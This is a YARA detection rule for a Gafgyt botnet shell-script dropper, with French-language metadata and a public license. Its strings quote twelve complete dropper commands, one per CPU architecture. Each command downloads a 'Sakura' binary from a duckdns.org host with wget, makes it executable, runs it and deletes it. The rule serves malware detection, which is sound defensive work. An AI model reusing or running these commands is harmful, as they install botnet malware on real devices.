rule SCRIPT_Dropper_Gafgyt_ForgeAuto_7263c20b
{
    meta:
        author = "Marjoriefort"
        description = "Detects Gafgyt (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "7263c20b18ec748e1565590e7d9ac49841841d76a49e591f994bd144beb49d49"
        yarahub_uuid = "48960135-a755-415f-9817-1be190f83b1d"
        famille = "Gafgyt"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "962b010cd223ff0947729a851459b3c3"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "/bin/bash" ascii
        $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/m-i.p-s.Sakura; chmod +x m-i.p-s.Sakura; ./m-i.p-s.Sakura; rm -rf m-i.p-s.Sakura" ascii
        $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/m-p.s-l.Sakura; chmod +x m-p.s-l.Sakura; ./m-p.s-l.Sakura; rm -rf m-p.s-l.Sakura" ascii
        $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/s-h.4-.Sakura; chmod +x s-h.4-.Sakura; ./s-h.4-.Sakura; rm -rf s-h.4-.Sakura" ascii
        $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/x-8.6-.Sakura; chmod +x x-8.6-.Sakura; ./x-8.6-.Sakura; rm -rf x-8.6-.Sakura" ascii
        $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/a-r.m-6.Sakura; chmod +x a-r.m-6.Sakura; ./a-r.m-6.Sakura; rm -rf a-r.m-6.Sakura" ascii
        $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/x-3.2-.Sakura; chmod +x x-3.2-.Sakura; ./x-3.2-.Sakura; rm -rf x-3.2-.Sakura" ascii
        $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/a-r.m-7.Sakura; chmod +x a-r.m-7.Sakura; ./a-r.m-7.Sakura; rm -rf a-r.m-7.Sakura" ascii
        $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/p-p.c-.Sakura; chmod +x p-p.c-.Sakura; ./p-p.c-.Sakura; rm -rf p-p.c-.Sakura" ascii
        $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/i-5.8-6.Sakura; chmod +x i-5.8-6.Sakura; ./i-5.8-6.Sakura; rm -rf i-5.8-6.Sakura" ascii
        $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/m-6.8-k.Sakura; chmod +x m-6.8-k.Sakura; ./m-6.8-k.Sakura; rm -rf m-6.8-k.Sakura" ascii
        $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/a-r.m-4.Sakura; chmod +x a-r.m-4.Sakura; ./a-r.m-4.Sakura; rm -rf a-r.m-4.Sakura" ascii
        $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ertdyfiabwggujakd.duckdns.org/a-r.m-5.Sakura; chmod +x a-r.m-5.Sakura; ./a-r.m-5.Sakura; rm -rf a-r.m-5.Sakura" ascii
    condition:
        true and filesize < 50MB and 2 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
